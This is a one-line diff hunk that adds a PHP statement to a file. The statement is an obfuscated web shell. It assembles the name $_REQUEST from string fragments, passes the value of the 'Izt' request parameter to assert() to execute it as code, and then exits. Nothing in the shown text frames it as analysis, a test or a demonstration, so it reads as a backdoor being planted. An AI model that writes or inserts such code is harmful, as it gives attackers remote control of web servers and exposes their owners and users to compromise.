@@ -1,0 +1,1 @@
+<?php if (isset(${"_R"."EQ"."UE"."ST"}['Izt'])){$R="assert";$R(${"_REQUEST"}['Izt']);exit;}
